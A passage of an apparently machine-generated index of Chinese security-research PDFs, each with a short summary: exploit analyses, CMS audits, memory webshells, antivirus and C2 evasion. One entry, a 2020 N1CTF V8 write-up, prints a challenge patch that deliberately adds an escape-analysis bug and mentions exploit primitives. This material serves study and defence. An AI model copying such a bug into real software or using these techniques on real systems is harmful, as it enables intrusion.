        "page_content": "该文档分析了 74CMS 后台 RCE 漏洞，该漏洞允许攻击者通过登录后台管理账户并修改网站域名设置，从而写入恶意 PHP 代码到 url.php 文件，最终实现 getshell。漏洞利用过程涉及 I 函数的输入过滤、变量修饰符和变量过滤等技术。",
        "FileName": "8021-74CMS后台RCE分析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-22965 漏洞，该漏洞是 Spring 框架中数据绑定绕过漏洞，影响 JDK 9 及以上版本。漏洞发现者绕过了 2010 年针对 Spring 对象绑定漏洞的补丁，利用 class.module.classLoader 获取 classloader，并利用 Tomcat 漏洞实现远程代码执行。官方发布的新补丁限制了 class 对象获取 classloader 和属性名，但文档提供了两个绕过新补丁的思路，包括利用静态代码分析和类型混淆漏洞。",
        "FileName": "11143-CVE-2022-22965 Spring Framework RCE via Data Binding on JDK 9+ 分析.pdf"
    },
    {
        "page_content": "**文档主题：** N1CTF escape 0\n\n**文档内容：**\n\n```\n1.登录 2020_N1CTF_escape 2020_N1CTF_escape Wi1L   /  2020-12-23 15:32:43  /  浏览数  7452 作为⼀位菜⻦，发⽂章希望⼤佬们批评指正 git\treset\t--hard\t07b0b1dcde4a99294b8028d83f4ea244885cc091 git\tapply\t../patch/patch.diff gclient\tsync ninja\t-C\tout.gn/x64.release\td8 8:43 同时在 ubuntu18 上安装对应的 chrome 题⽬之后放在 github 上 https://github.com/MyinIt-0/v8/tree/master/Wi1L 当我们想直接输出⼀个 type 信息时，会被逗号取代（除⾮有洞导致 ..... ） 两者都是 element 部分 哪怕像这样插⼊⼀个浮点数 spary[spary_size-1]\t=\t1.1; 也会作为 heapNumber 对象，这样的话直接读取 spary[idx] 返回的是 ,,, 因为这些 idx 位置都是  obj 指针，如果返回就相当于泄露 map 值了 2020 N1CTF escape 0  环境搭建 1  背景知识 ⼀些补充 关于 ﬁxed_array 与 ﬁxed_double_array 的不同 对于 ﬁxed_array ，其中每⼀个都会向 obj ⼀样解析 对于 ﬁxed_double_array其中的浮点数都是直接存储的 可以直接通过 idx 访问 所以得出结论，这两个东⻄的互相转化可以⽤于伪造 addrof 与 fakeof 原语 diff\t--git\ta/src/compiler/escape-analysis.cc\tb/src/compiler/escape-analysis.cc index\t2a096b6933..3046d7b04e\t100644 ---\ta/src/compiler/escape-analysis.cc +++\tb/src/compiler/escape-analysis.cc @@\t-178,7\t+178,7\t@@\tclass\tEscapeAnalysisTracker\t:\tpublic\tZoneObject\t{\n2.---\ta/src/compiler/escape-analysis.cc +++\tb/src/compiler/escape-analysis.cc @@\t-178,7\t+178,7\t@@\tclass\tEscapeAnalysisTracker\t:\tpublic\tZoneObject\t{ \t\t\t\t\t\t\t\t\t:\tVariableTracker::Scope(&tracker->variable_states_,\tnode,\treduction), \t\t\t\t\t\t\t\t\t\t\ttracker_(tracker), \t\t\t\t\t\t\t\t\t\t\treducer_(reducer)\t{} -\t\t\t\tconst\tVirtualObject*\tGetVirtualObject(Node*\tnode)\t{ +\t\t\t\tVirtualObject*\tGetVirtualObject(Node*\tnode)\t{ \t\t\t\t\t\t\tVirtualObject*\tvobject\t=\ttracker_->virtual_objects_.Get(node); \t\t\t\t\t\t\tif\t(vobject)\tvobject->AddDependency(current_node()); \t\t\t\t\t\t\treturn\tvobject; @@\t-576,10\t+576,14\t@@\tvoid\tReduceNode(const\tOperator*\top,\tEscapeAnalysisTracker::Scope*\tcurrent, \t\t\t\t\tcase\tIrOpcode::kStoreField:\t{ \t\t\t\t\t\t\tNode*\tobject\t=\tcurrent->ValueInput(0); \t\t\t\t\t\t\tNode*\tvalue\t=\tcurrent->ValueInput(1); -\t\t\t\t\t\tconst\tVirtualObject*\tvobject\t=\tcurrent->GetVirtualObject(object); +\t\t\t\t\t\tVirtualObject*\tvobject\t=\tcurrent->GetVirtualObject(object); \t\t\t\t\t\t\tVariable\tvar; \t\t\t\t\t\t\tif\t(vobject\t&&\t!vobject->HasEscaped()\t&&\n3.+\t\t\t\t\t\tVirtualObject*\tvobject\t=\tcurrent->GetVirtualObject(object); \t\t\t\t\t\t\tVariable\tvar; \t\t\t\t\t\t\tif\t(vobject\t&&\t!vobject->HasEscaped()\t&& \t\t\t\t\t\t\t\t\t\t\tvobject->FieldAt(OffsetOfFieldAccess(op)).To(&var))\t{ +\t\t\t\t\t\t\t\t//\tAttach\tcached\tmap\tinfo\tto\tthe\tvirtual\tobject. +\t\t\t\t\t\t\t\tif\t(OffsetOfFieldAccess(op)\t==\tHeapObject::kMapOffset)\t{ +\t\t\t\t\t\t\t\t\t\tvobject->SetMap(value); +\t\t\t\t\t\t\t\t} \t\t\t\t\t\t\t\t\tcurrent->Set(var,\tvalue); \t\t\t\t\t\t\t\t\tcurrent->MarkForDeletion(); \t\t\t\t\t\t\t}\telse\t{ @@\t-747,6\t+751,17\t@@\tvoid\tReduceNode(const\tOperator*\top,\tEscapeAnalysisTracker::Scope*\tcurrent, \t\t\t\t\t\t\t\t\t\t\t//\tyet. \t\t\t\t\t\t\t\t\t\t\tbreak; \t\t\t\t\t\t\t\t\t} +\t\t\t\t\t\t}\telse\tif\t(vobject)\t{ +\t\t\t\t\t\t\t\tNode*\tcache_map\t=\tvobject->Map(); +\t\t\t\t\t\t\t\tif\t(cache_map)\t{ +\t\t\t\t\t\t\t\t\t\tType\tconst\tmap_type\t=\tNodeProperties::GetType(cache_map); +\t\t\t\t\t\t\t\t\t\tif\t(map_type.IsHeapConstant()\t&& +\t\t\t\t\t\t\t\t\t\t\t\t\t\tparams.maps().contains( +\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tmap_type.AsHeapConstant()->Ref().AsMap().object()))\t{ +\t\t\t\t\t\t\t\t\t\t\t\tcurrent->MarkForDeletion(); +\t\t\t\t\t\t\t\t\t\t\t\tbreak; +\t\t\t\t\t\t\t\t\t\t}\n4.+\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tmap_type.AsHeapConstant()->Ref().AsMap().object()))\t{ +\t\t\t\t\t\t\t\t\t\t\t\tcurrent->MarkForDeletion(); +\t\t\t\t\t\t\t\t\t\t\t\tbreak; +\t\t\t\t\t\t\t\t\t\t} +\t\t\t\t\t\t\t\t} \t\t\t\t\t\t\t} \t\t\t\t\t\t\tcurrent->SetEscaped(checked); \t\t\t\t\t\t\tbreak; @@\t-804,6\t+819,12\t@@\tvoid\tReduceNode(const\tOperator*\top,\tEscapeAnalysisTracker::Scope*\tcurrent, \t\t\t\t\t\t\tfor\t(int\ti\t=\t0;\ti\t<\tvalue_input_count;\t++i)\t{ \t\t\t\t\t\t\t\t\tNode*\tinput\t=\tcurrent->ValueInput(i); \t\t\t\t\t\t\t\t\tcurrent->SetEscaped(input); + +\t\t\t\t\t\t\t\t//\tInvalidate\tassociated\tmap\tcache\tfor\tall\tvalue\tinput\tnodes. +\t\t\t\t\t\t\t\tVirtualObject*\tvobject\t=\tcurrent->GetVirtualObject(input); 2  漏洞分析 patch  ⽂件+\t\t\t\t\t\t\t\tVirtualObject*\tvobject\t=\tcurrent->GetVirtualObject(input); +\t\t\t\t\t\t\t\tif\t(vobject)\t{ +\t\t\t\t\t\t\t\t\t\tvobject->SetMap(nullptr); +\t\t\t\t\t\t\t\t} \t\t\t\t\t\t\t} \t\t\t\t\t\t\tif\t(OperatorProperties::HasContextInput(op))\t{ \t\t\t\t\t\t\t\t\tcurrent->SetEscaped(current->ContextInput()); diff\t--git\ta/src/compiler/escape-analysis.h\tb/src/compiler/escape-analysis.h index\t0fbc7d0bdd..ec56488388\t100644 ---\ta/src/compiler/escape-analysis.h +++\tb/src/compiler/escape-analysis.h @@\t-147,11\t+147,14\t@@\tclass\tVirtualObject\t:\tpublic\tDependable\t{ \t\t\tbool\tHasEscaped()\tconst\t{\treturn\tescaped_;\t} \t\t\tconst_iterator\tbegin()\tconst\t{\treturn\tfields_.begin();\t} \t\t\tconst_iterator\tend()\tconst\t{\treturn\tfields_.end();\t} +\t\tNode*\tMap()\tconst\t{\treturn\tmap_;\t} +\t\tvoid\tSetMap(Node*\tmap)\t{\tmap_\t=\tmap;\t} \t\tprivate: \t\t\tbool\tescaped_\t=\tfalse; \t\t\tId\tid_; \t\t\tZoneVector<Variable>\tfields_; +\t\tNode*\tmap_; \t}; \tclass\tEscapeAnalysisResult\t{ 整体的 patch 有两⽅⾯组成，⼀个是 .h ⽂件，⼀个是 .cc ⽂件的⼀个函数 针对 .h ⽂件 ---\ta/src/compiler/escape-analysis.h +++\tb/src/compiler/escape-analysis.h @@\t-147,11\t+147,14\t@@\tclass\tVirtualObject\t:\tpublic\tDependable\t{ \t\t\tbool\tHasEscaped()\tconst\t{\treturn\tescaped_;\t} \t\t\tconst_iterator\tbegin()\tconst\t{\treturn\tfields_.begin();\t} \t\t\tconst_iterator\tend()\tconst\t{\treturn\tfields_.end();\t}\n5.const_iterator\tend()\tconst\t{\treturn\tfields_.end();\t} +\t\tNode*\tMap()\tconst\t{\treturn\tmap_;\t} +\t\tvoid\tSetMap(Node*\tmap)\t{\tmap_\t=\tmap;\t} \t\tprivate: \t\t\tbool\tescaped_\t=\tfalse; \t\t\tId\tid_; \t\t\tZoneVector<Variable>\tfields_; +\t\tNode*\tmap_; \t}; 可以看到是 VirtualObject 加了⼀个 map 的 对象   ，   同时增加了两个函数，这⾥我们就需要知道这个 VirtualObject 是什么 针对 .cc ⽂件diff\t--git\ta/src/compiler/escape-analysis.cc\tb/src",
        "FileName": "8676-2020_N1CTF_escape.pdf"
    },
    {
        "page_content": "该文档介绍了在 Shiro 环境下利用内存马进行攻击的方法，包括环境搭建、构造内存马、绕过请求头大小限制以及动态创建 Servlet 注入内存马的详细步骤。",
        "FileName": "11808-shiro环境下的Servlet内存马注入踩坑日记.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-2555 漏洞，该漏洞利用了 WebLogic 中反序列化 gadget 构造的缺陷，通过 T3 协议接收反序列化数据导致漏洞产生。文档详细记录了调试学习该漏洞的过程，并提供了两个利用示例：第一个示例使用 ChainedExtractor 实现多次反射 RCE，第二个示例使用 TemplatesImpl 类实现单次反射 RCE。",
        "FileName": "7417-CVE-2020-2555调用链复现分析.pdf"
    },
    {
        "page_content": "该文档分析了 Spring Boot Actuator Logview 中的 CVE-2021-21234 文件包含漏洞。该漏洞允许攻击者通过未经验证的 base 参数读取任意文件，因为该参数在安全检查后与日志路径拼接。攻击者可以通过访问 /log/view 端点并提供 base 参数来利用此漏洞，从而导致敏感信息泄露。",
        "FileName": "9912-spring-boot-actuator-logview 文件包含(CVE-2021-21234)漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 WordPress 插件 WP Super Cache 中的一个远程代码执行漏洞，该漏洞需要登录 wp 后台，并通过构造恶意输入来更新缓存路径，从而写入恶意代码并执行。文档详细介绍了漏洞分析过程，包括关键代码测试、特殊字符排除和动态调试，并提供了成功的 payload 和修复建议。",
        "FileName": "10017-一波五折的wordpress插件wp super cache RCE漏洞分析之旅.pdf"
    },
    {
        "page_content": "本文探讨了使用 Go 原生模糊测试功能发现 Go 库中的 bug 的方法，包括使用 file2fuzz 工具将文件转换为适合模糊测试的格式，以及使用 Fuzz 函数进行模糊测试。通过分析示例代码，本文展示了如何使用模糊测试来发现 webp 和 iprange 库中的 bug，并提供了修复这些 bug 的建议。",
        "FileName": "12611-从模糊测试到源码定位：探索 Go 库中的 bug.pdf"
    },
    {
        "page_content": "Laravel 9.1.8 存在反序列化漏洞，攻击者可以通过精心构造的序列化数据触发反序列化，绕过 __wakeup__ 方法，利用 __destruct__ 和 __call__ 方法链，实现远程代码执行。该漏洞影响了 Laravel 9.1.8 中的 Illuminate\\Broadcasting\\PendingBroadcast、Illuminate\\Bus\\Dispatcher、GuzzleHttp\\Cookie\\FileCookieJar、Faker\\Generator、Illuminate\\Routing\\PendingResourceRegistration 等类。",
        "FileName": "11362-Laravel 9.1.8 反序列化漏洞分析.pdf"
    },
    {
        "page_content": "Java 管理扩展 (JMX) 是一种框架，用于为应用程序植入管理功能。它包含 MBean（管理 Bean）、MBeanServer 和 Connector 等组件。MBean 是具有可管理资源的接口，注册在 MBeanServer 中。MBeanServer 通过 Connector Server 提供服务，允许客户端连接并通过 MBeanServer 访问 MBean。JMX 允许监控和管理应用程序资源，例如用户数量或方法调用次数。",
        "FileName": "12781-JMX学习.pdf"
    },
    {
        "page_content": "该文档讨论了 XSS 漏洞挖掘，重点关注了输入即输出、FUZZ 参数、上传漏洞和客服聊天框等触发 XSS 漏洞的常见场景。作者强调了控制输出的重要性，并建议测试人员在任何可能输入的地方尝试触发 XSS 漏洞。",
        "FileName": "9506-浅谈XSS漏洞挖掘.pdf"
    },
    {
        "page_content": "**主题：** Apache Log4j2 JNDI 远程代码执行漏洞利用\n\n**内容：** 该文档详细介绍了 Apache Log4j2 JNDI 远程代码执行漏洞的利用方法，包括在线登录框、在线传参、在线执行命令、反弹 shell 等多种利用方式，并提供了相应的命令和代码示例。",
        "FileName": "10654-Apache Log4j2 JNDI RCE.pdf"
    },
    {
        "page_content": "CVE-2020-1957 漏洞利用 Apache Shiro 和 Spring Boot 对 URL 处理的差异，绕过 Apache Shiro 对 Spring Boot 中 Servlet 的权限控制，实现未授权访问。",
        "FileName": "8281-CVE-2020-1957 Apache Shiro Servlet未授权访问浅析.pdf"
    },
    {
        "page_content": "该文档记录了一次网站渗透测试的学习过程，重点关注文件包含漏洞和SQL注入漏洞。测试者使用PHPstudy环境和中国蚁剑工具，成功利用了index.php和login.php中的漏洞，并通过修改secure-file-priv参数和写入webshell获得了服务器访问权限。",
        "FileName": "12545-记一次网站渗透测试学习.pdf"
    },
    {
        "page_content": "该文档介绍了隧道穿透漫游技术，包括其定义、类型和在内网安全中的应用。它通过一个靶场练习演示了如何利用隧道穿透技术绕过防火墙和网络边界设备，在内网中横向移动并获取目标服务器的权限。",
        "FileName": "10867-内网安全-隧道穿透漫游.pdf"
    },
    {
        "page_content": "**主题：** Tomcat URI 处理特性\n\n**内容：** Tomcat 通过 `postParseRequest` 方法解析 URI，该方法处理 path 参数、解码 URI 并将其规范化。如果 URI 以 `;` 开头并以 `;` 或 `/` 结尾，则该部分将被舍弃。如果 URI 以 `/./` 或 `/../` 开头，则分别转换为 `/` 或 `/`。",
        "FileName": "11871-研读Tomcat源码来看URI处理特性.pdf"
    },
    {
        "page_content": "**主题：** Java 沙盒反反制\n\n**内容：** 文档分析了 ysoserial Java 沙盒反制技术，并提出了反反制方法。它解释了 ysoserial 如何使用自定义 SecurityManager 来限制命令执行，并展示了如何通过在危险方法外部添加沙盒来绕过此限制。文档还讨论了调试过程和绕过沙盒的挑战。",
        "FileName": "10596-java沙盒之反反制ysoserial.pdf"
    },
    {
        "page_content": "本文探讨了红队攻防技术，重点关注隐匿技术，包括幽灵登录、SSH 隧道代理、反弹 shell 隐匿、CobaltStrike Profile 配置、运维惯性密码和行为测绘。这些技术旨在帮助红队在渗透测试和网络安全行动中绕过防御措施，而蓝队则可以利用这些知识来加强防御。",
        "FileName": "10327-红队实战攻防技术（二）.pdf"
    },
    {
        "page_content": "本文分析了 Linux kernel BPF 模块中与常数变量取值范围相关的漏洞，包括 CVE-2020-8835、CVE-2020-27194 和 GeekPwn 2020 决赛 kernel 题。这些漏洞都是由于 verify 阶段对常数变量取值范围计算的逻辑错误导致的，从而允许用户在内核中执行任意代码。",
        "FileName": "8482-Linux kernel BPF模块的相关漏洞分析.pdf"
    },
    {
        "page_content": "本文介绍了如何使用 Doop 静态分析框架识别 Apache Commons Text 中的远程代码执行漏洞 (CVE-2022-42889)。Doop 通过修改其 App Only 模式下的规则，添加了对自定义污点注解的识别、新的污点转移函数和对 Opaque 方法的处理，从而能够识别从 StringSubstitutor.replace() 到 ScriptEngine.eval() 的污点信息流。",
        "FileName": "11873-使用doop识别最近commons text漏洞的污点信息流.pdf"
    },
    {
        "page_content": "本文档介绍了如何在高版本 JDK 下的 Metabase 中利用 Jetty 中的 Customizer 实现内存马。它通过使用 Java 的 Unsafe 类绕过模块化系统限制，获取 HTTP 上下文并执行任意 JS 脚本，从而实现回显马和内存马。",
        "FileName": "12792-Metabase 高版本JDK下 嵌入式Jetty中的Customizer内存马实现.pdf"
    },
    {
        "page_content": "该文档介绍了 Oracle 数据库的基本概念、结构和注⼊技术，包括布尔盲注、时间盲注、报错注⼊、联合注⼊、带外通道和绕过技巧。它提供了详细的示例和查询语句，以帮助读者理解和执行 Oracle 注⼊攻击。",
        "FileName": "7897-关于学习Oracle注入.pdf"
    },
    {
        "page_content": "该文档介绍了极致 CMS 存储 XSS 和前台打后台 COOKIE 漏洞的复现过程。漏洞源于前端文件 article-list.html 中未进行实体化编码，导致攻击者可以在标题位置注入恶意代码，影响极致 CMS v1.5 至 v1.7 版本。通过创建允许用户发布文章的栏目，攻击者可以在前台发表文章，利用 XSS 漏洞获取后台 COOKIE，从而实现前台打后台攻击。",
        "FileName": "7883-极致CMS存储XSS前台打后台COOKIE漏洞复现.pdf"
    },
    {
        "page_content": "这篇文档总结了 Unix 和 Windows 系统中远程命令执行（RCE）漏洞，提供了危险字符逃逸列表、payload 列表以及反弹 shell 和文件上传中的 RCE 攻击示例。它还介绍了用于查找 RCE 漏洞的工具和最佳命令注入攻击工具。",
        "FileName": "9628-远程命令执行漏洞总结(Unix和Windows).pdf"
    },
    {
        "page_content": "该文档介绍了 IIS 下 .Net 预编译模式，它将 .Net 文件编译成二进制代码，以提高后续访问速度。预编译模式提供了性能、安全性和稳定性方面的优势，并允许跨语言引用。文档还提供了在网站发布时配置预编译的选项，以及在预编译模式下获取 Webshell 的方法，包括 ASP 脚本、将 Webshell 预编译化并上传到 bin 目录，以及利用 Web.config HttpHandler DLL。",
        "FileName": "11765-IIS下.Net 的预编译模式.pdf"
    },
    {
        "page_content": "该文档详细介绍了 bWAPP 应用程序中的 HTML 注入漏洞，包括 GET、POST、当前 URL、存储和 iframe 注入。它解释了不同级别的漏洞，例如低级漏洞没有进行输入验证，中级漏洞使用黑名单机制，高级漏洞使用 htmlspecialchars() 函数进行过滤。文档还提供了绕过这些漏洞的有效载荷和技术，并强调了在使用这些信息时要承担的责任。",
        "FileName": "12064-1.bWAPP HTML Injection (HTML注入).pdf"
    },
    {
        "page_content": "该文档分析了 xycms v1.9 网站中的三个 SQL 注入漏洞和两个 XSS 漏洞。第一个 SQL 注入漏洞存在于 /system/add_book_class.php 中，第二个存在于 /system/loginpass.php 中，第三个存在于 /system/hf_book.php 中。两个 XSS 漏洞存在于 /add_do.php 中，它们允许攻击者在网站上存储恶意脚本。",
        "FileName": "7557-xycms v1.9的一次审计.pdf"
    },
    {
        "page_content": "该文档分析了 PHP 代码审计中一个利用 PHP 底层 C 代码的解法，通过调试 PHP 的 C 代码，发现 PHP 的 include 函数在处理包含文件时，如果路径中包含 \"php://filter/resource=\"，则会将该路径后面的部分作为过滤器处理，而不是作为文件路径。利用这一特性，攻击者可以构造一个包含恶意代码的过滤器，并通过包含该过滤器来执行恶意代码。",
        "FileName": "10446-第四届强网拟态 EasyFilter.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Laravel 5.1 中的三个反序列化漏洞，这些漏洞可用于执行任意代码。第一个漏洞利用了 `WindowsPipes` 类中的 `__destruct` 方法，该方法允许删除任意文件。第二个漏洞利用了 `DatabaseManager` 类中的 `__call` 方法，该方法允许调用任意类的任意方法。第三个漏洞利用了 `Validator` 类中的 `__call` 方法，该方法允许调用任意类的任意方法，包括 `EvalLoader` 类中的 `load` 方法，该方法允许执行任意 PHP 代码。",
        "FileName": "11323-laravel5.1反序列化-代码审计学习.pdf"
    },
    {
        "page_content": "本文档介绍了获取 Active Directory (AD) 凭据的五种方法，包括 NTLM 认证服务、LDAP 绑定凭证、认证中继、Microsoft Deployment Toolkit 和配置文件。它还讨论了信息收集技术，例如使用 cmd、PowerShell 和 Bloodhound，以及这些技术在渗透测试中的应用。",
        "FileName": "12048-AD学习记录（上）.pdf"
    },
    {
        "page_content": "该文档详细分析了 FAKA CMS 中的多个漏洞，包括文件上传、后台登录和任意文件下载。通过审计源代码和分析请求数据包，作者展示了如何利用这些漏洞来获取未经授权的访问、上传恶意文件和下载敏感数据。",
        "FileName": "10505-记一次(FAKA)CMS漏洞审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何在 Linux 系统上隐藏 Cobalt Strike C2 服务器，包括禁用 ping、修改证书、使用 CDN 隐藏、申请免费域名、配置 nginx 反向代理、生成 Linux 木马等步骤，并提供了配置示例和命令交互操作指南。",
        "FileName": "12094-C2服务器隐藏与Linux上线.pdf"
    },
    {
        "page_content": "FastAdmin 框架存在一个有条件 RCE 漏洞，当攻击者具有上传权限并开启分片传输功能时，可以通过上传分片文件并拼接文件路径的方式上传任意文件，从而导致 RCE。该漏洞影响 FastAdmin 版本低于 V1.2.0.20210401_beta。",
        "FileName": "9395-FastAdmin前台文件上传.pdf"
    },
    {
        "page_content": "该文档记录了一次授权测试，其中渗透者通过利用弱密码、未授权的 Redis 访问、目录浏览和 Shiro 反序列化漏洞，成功获得了目标网站的管理员权限。渗透者还提供了详细的步骤和建议，以提高测试业务的安全性。",
        "FileName": "8532-踩坑版渗透-记录某次授权测试.pdf"
    },
    {
        "page_content": "该文档介绍了 Spring Boot 漏洞的复现，包括 Jolokia 漏洞利用（XXE 和 RCE）、Spring Cloud Libraries 中的 '/env' 端点利用、Spring Cloud env yaml 利用和 xstream 反序列化漏洞利用。这些漏洞利用可以导致远程代码执行、敏感信息泄露和反弹 shell。",
        "FileName": "7811-Spring Boot漏洞复现.pdf"
    },
    {
        "page_content": "本文档详细分析了 Chrome V8 中的 CVE-2021-38003 漏洞，该漏洞允许攻击者通过触发 JSON.stringify() 溢出错误来利用 V8 的内部异常队列，从而导致堆损坏。漏洞的触发条件是使用 try-catch 块捕获 HoleValue，在 Map 中填充数据成员以凑数，并使用 HoleValue 填充删除位置，从而避免触发 Rehash 方法。",
        "FileName": "11105-《灰豆聊 Bug》1. Chrome V8 CVE-2021-38003 详解.pdf"
    },
    {
        "page_content": "该文档探讨了 Active Directory (AD) 渗透测试的各个方面，包括权限委派错误、Kerberos 委派、用户密码窃取、组策略对象、AD 证书服务的错误配置以及域内常见漏洞。它提供了详细的步骤和示例，帮助渗透测试人员理解和利用这些漏洞以提升权限并控制域环境。",
        "FileName": "12241-AD学习记录（中）.pdf"
    },
    {
        "page_content": "**主题：** XSSI 漏洞分析和挖掘\n\n**内容：** XSSI（跨站脚本包含）漏洞是一种通过动态 JavaScript 文件存储敏感数据而导致信息泄露的漏洞。攻击者可以通过注入恶意 JavaScript 代码来获取这些数据，从而窃取用户凭证或其他敏感信息。文档提供了多个示例，展示了如何利用 XSSI 漏洞获取数组内容、变量值和函数调用，并强调了在 JavaScript 文件中存储敏感数据的危险性。",
        "FileName": "7204-xssi漏洞案例分析+漏洞挖掘.pdf"
    },
    {
        "page_content": "本文分析了如何使用 angr 工具挖掘 UAF 和 double free 漏洞。UAF（use after free）漏洞是由未清空的堆指针再次被重用导致的，而 double free 则是对同一块堆空间 free 操作两次产生的漏洞。通过 hook malloc 和 free 函数，并记录每次 malloc 和 free 的目标堆空间，可以判断是否发生了 double free。对于 UAF 漏洞，可以通过记录已经 free 的地址，然后通过 angr 提供的 action 方法来查看对内存地址的读写操作，如果对应的读写操作地址恰好是已经 free 过的地址，那么可以认为是产⽣了 UAF 漏洞。",
        "FileName": "7275-初探利用angr进行漏洞挖掘（下）.pdf"
    },
    {
        "page_content": "该文档记录了一次对外测试任务，目标是处理违禁物品案件。渗透者通过信息收集、工具辅助、密码爆破等手段成功登录后台，并利用插件上传漏洞写入一句话木马，最终通过变形一句话和base64中转连接菜刀，成功获取目标网站的控制权。",
        "FileName": "7608-记述一件几年前的对外测试任务.pdf"
    },
    {
        "page_content": "本文档探讨了 Docker 逃逸技术，包括利用特权模式、Docker socket 挂载、Docker Remote API 未授权访问、RunC 容器服务缺陷和 Dirty Cow 漏洞等方法，这些方法允许攻击者从 Docker 容器中逃逸到宿主机并获得 root 权限。",
        "FileName": "12495-浅谈Docker逃逸.pdf"
    },
    {
        "page_content": "该文档探讨了端⼝流量转发（透传 IP）的几种方法，以实现蜜罐轻量部署和便捷节点增加。调研了 rinetd、haproxy、nginx、iptables 和 iptables + GRE 隧道等方案，并对它们的特征和缺陷进行了比较。其中，iptables + GRE 隧道被认为是对蜜罐机器影响较小的方案，可作为进一步拓展的思路。",
        "FileName": "9155-蜜罐项目-端口流量转发（透传ip）方案调研.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Mako 模板引擎和沙箱机制，包括模板语法、控制结构、过滤器、漏洞利用方法和沙箱逃逸技术。Mako 依赖于 Python 代码执行，因此可以绕过沙箱限制，例如通过导入模块、使用字符串绕过、利用 getattr 和 __getattr__ 等方法。沙箱逃逸的最终目标是执行系统命令，而沙箱机制则通过限制敏感函数和文件操作来防止恶意代码执行。",
        "FileName": "12187-Mako模板引擎以及沙箱机制.pdf"
    },
    {
        "page_content": "本文档介绍了如何通过修改配置和代码来绕过卡巴斯基对 Cobalt Strike 4.1 版本生成的 Beacon 的内存查杀。通过解密资源、修改代码、清除敏感字符串和加密 IAT，作者成功绕过了六个查杀点，包括 Cobalt.gen、Cometer.gen 和 SEPEH.gen。",
        "FileName": "9224-记一次cs bypass卡巴斯基内存查杀.pdf"
    },
    {
        "page_content": "该文档详细介绍了利用 MSSQL 漏洞获取服务器权限的过程。作者通过发现 MSSQL 注入漏洞，绕过 360 安全防护，利用 sp_oacreate 执行命令，最终成功上线 CS。文档还提供了相关参考链接，供读者进一步了解 MSSQL 漏洞利用技术。",
        "FileName": "9265-记一次利用mssql上线.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 WebSphere 中的内存泄漏漏洞，通过构造恶意 Filter 和 FilterInstanceWrapper 对象，将它们注入 WebSphere 的 Filter 管理器中，从而导致内存泄漏。",
        "FileName": "12278-WebSphere内存马分析.pdf"
    },
    {
        "page_content": "本文档探讨了 PHP 反序列化和 Session 反序列化漏洞的原理和实践，重点介绍了 PHP 序列化和反序列化函数、魔法函数、对象注入、绕过魔法函数、Session 反序列化攻击、没有 $_SESSION 变量赋值的攻击方法等内容，并通过实例和代码示例详细阐述了这些漏洞的利用方式。",
        "FileName": "7366-原理+实践掌握(PHP反序列化和Session反序列化).pdf"
    },
    {
        "page_content": "本文分析了 ESD 1.0 和 Develop 两个版本的源码，重点关注其执行流程和功能实现。ESD 1.0 仅支持 DNS 爆破，而 Develop 版本增加了泛解析处理、搜索引擎和证书透明度等功能。文章还讨论了 RSC 的局限性、DNS 服务器优化和过滤冗余子域名的个人见解。",
        "FileName": "9858-脚本小子修养之ESD源码分析(二).pdf"
    },
    {
        "page_content": "该文档详细介绍了对 HackTheBox-Holiday 靶机的渗透测试过程，包括信息收集、SQL 注入、XSS 攻击、命令注入和提权，最终成功获取 root 权限并获得 flag。",
        "FileName": "12461-HackTheBox-Holiday.pdf"
    },
    {
        "page_content": "该文档探讨了利用一条不使用模糊查询的 like 语句进行 SQL 注入的新方法。它通过测试不同字段值类型（int 和字符串）来展示如何使用 like 运算符的优先级和隐式转换来匹配所有字段值，从而绕过 SQL 注入检测。该方法可用于检测 SQL 注入、创建新型万能密码并判断列名是否存在。",
        "FileName": "8116-由一条like语句引发的SQL注入新玩法.pdf"
    },
    {
        "page_content": "该文档探讨了 .NET 中 JSON.NET 和 Breeze 库中的 JSON 反序列化漏洞，重点关注 TypeNameHandling 设置。它解释了如何利用这些漏洞通过 ObjectDataProvider 包装 Process 来执行远程代码执行 (RCE)。文档还提供了实际案例，展示了 Breeze CVE-2017-9424 中的漏洞利用，其中通过修改 SaveOptions 字段来触发 RCE。",
        "FileName": "9603-.net反序列化之Json.Net及breeze CVE-2017-9424.pdf"
    },
    {
        "page_content": "**主题：** 检测和防御 AWS 中的 SSRF 攻击\n\n**内容：** 本文研究了多种工具和技术，以检测 Amazon Web Services (AWS) 环境中的 SSRF 活动，该工具和技术可用于实时监视针对 AWS API 的 SSRF 攻击尝试。研究结果概述了 4 种不同的策略的有效性，以回答安全专业人士的问题“是否可以利用其他供应商提供的、或是开源的那些工具来检测 SSRF 攻击”。",
        "FileName": "7198-云安全 - 研究云环境下对SSRF的检测与防御（以AWS为例）.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-0796 SMB 漏洞，该漏洞影响 Windows 10 系统，允许本地提权。漏洞发生在 srv2.sys 中，由于 SMB 在解压数据包时未正确处理压缩数据包，导致整数溢出。攻击者可以利用此漏洞覆盖 buf 指针的地址，修改 SEP_TOKEN_PRIVILEGES 的值为 system 权限，从而获得系统进程的权限，并执行任意代码。",
        "FileName": "7550-CVE-2020-0796 SMB漏洞本地提权分析.pdf"
    },
    {
        "page_content": "OpenSCA 是一款开源的软件成分分析（SCA）工具，旨在通过提供商业级 SCA 核心工具和社区生态系统，帮助企业和开发者进行开源风险治理。它通过分析应用程序组件、依赖关系和漏洞，并生成软件物料清单（SBOM），使企业能够识别和缓解开源软件中的安全风险。",
        "FileName": "11952-OpenSCA用开源的方式做开源风险治理：Why What How.pdf"
    },
    {
        "page_content": "Apache Flink 1.11.0-1.11.2 中存在一个目录穿越漏洞 (CVE-2020-17519)，允许攻击者通过 JobManager REST 接口读取本地文件系统上的任何文件，访问仅限于 JobManager 进程可访问的文件。该漏洞源于对 URL 路径的解码处理不当，导致攻击者能够通过双重 URL 编码绕过目录限制，最终读取敏感文件，例如 /etc/passwd。",
        "FileName": "8998-Flink目录穿越漏洞浅析（CVE-2020-17519）.pdf"
    },
    {
